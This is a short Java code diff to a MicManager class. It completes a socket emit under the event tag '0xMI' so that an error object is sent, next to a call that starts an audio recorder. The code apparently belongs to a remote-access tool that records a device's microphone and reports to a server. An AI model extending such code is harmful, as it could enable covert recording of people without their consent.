@@ -57,7 +57,7 @@ public  class MicManager {
             object.put("file",true);
             object.put("name","true");
             object.put("buffer" , e.getMessage());
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , );
+            IOSocket.getInstance().getIoSocket().emit("0xMI" ,object );
 
         }
         recorder.start();
